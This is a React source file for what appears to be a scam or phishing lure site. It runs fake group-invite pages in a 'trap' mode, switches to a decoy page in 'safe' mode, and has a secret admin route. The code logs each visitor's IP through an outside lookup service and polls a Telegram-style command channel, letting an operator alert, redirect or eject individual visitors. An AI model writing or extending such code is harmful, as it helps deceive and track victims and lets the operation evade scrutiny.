
import React, { useState, useEffect } from 'react';
import AdminPanel from './components/AdminPanel';
import PublicView from './components/PublicView';
import HomeDecoy from './components/HomeDecoy';
import { getGroupById, parseInviteLink, getSiteMode, checkRemoteCommands } from './services/storage';
import { GroupData, SiteMode } from './types';

const App: React.FC = () => {
  const [currentHash, setCurrentHash] = useState(window.location.hash);
  const [activeGroup, setActiveGroup] = useState<GroupData | null>(null);
  const [siteMode, setSiteModeState] = useState<SiteMode>('trap');

  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash;
      setCurrentHash(hash);
      
      // 1. Check for Admin
      if (hash === '#admin') return;

      // 2. Check for Portable Invite Link (Cross-Browser)
      if (hash.startsWith('#invite/')) {
        const groupFromLink = parseInviteLink(hash);
        setActiveGroup(groupFromLink);
        return;
      }

      // 3. Check for Legacy ID Link (Local Browser only)
      if (hash.startsWith('#group/')) {
        const id = hash.split('/')[1];
        const group = getGroupById(id);
        setActiveGroup(group || null);
        return;
      }

      // 4. Default
      setActiveGroup(null);
    };

    // Initial check
    handleHashChange();
    setSiteModeState(getSiteMode());

    // --- TELEGRAM COMMAND POLLING ---
    // Check for commands every 5 seconds (faster polling for responsiveness)
    const startPolling = async () => {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            const ip = data.ip;
            
            // Loop
            const interval = setInterval(async () => {
                const action = await checkRemoteCommands(ip);
                
                // EXECUTE ACTIONS
                if (action.type === 'ALERT' && action.payload) {
                    alert(action.payload);
                } 
                else if (action.type === 'REDIRECT' && action.payload) {
                    let url = action.payload;
                    if (!url.startsWith('http')) url = 'https://' + url;
                    window.location.href = url;
                }
                else if (action.type === 'RELOAD') {
                    window.location.reload();
                }
                else if (action.type === 'KICK') {
                    // Redirect to a benign site
                    window.location.href = 'https://www.google.com';
                }

                // Sync local state (for mode changes)
                setSiteModeState(getSiteMode());
            }, 5000); // 5 seconds interval
            
            return () => clearInterval(interval);
        } catch (e) {
            // Offline or blocked
        }
    };
    
    // Only poll if NOT in admin panel
    if (window.location.hash !== '#admin') {
        startPolling();
    }

    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  // Route: Secret Admin Panel
  if (currentHash === '#admin') {
    return <AdminPanel />;
  }
  
  // SAFE MODE CHECK
  // If admin switched mode to 'safe', show the decoy page instead of the trap
  if (siteMode === 'safe') {
      return <HomeDecoy />;
  }

  // Route: Public Group View (Specific Invite Link or Data Link)
  if (currentHash.startsWith('#group/') || currentHash.startsWith('#invite/')) {
      if (activeGroup) {
        return <PublicView data={activeGroup} />;
      } else {
         // Invite link invalid
         return (
            <div className="min-h-screen flex flex-col items-center justify-center bg-[#0b141a] p-4 text-center font-sans text-gray-200">
                <h1 className="text-xl font-bold mb-2">Invite Link Expired</h1>
                <p className="text-gray-400 text-sm">This group invite link is no longer valid.</p>
            </div>
         );
      }
  }

  // Route: Default / Root
  // Show PublicView with no specific target (will render list of all groups)
  return <PublicView data={null} />;
};

export default App;
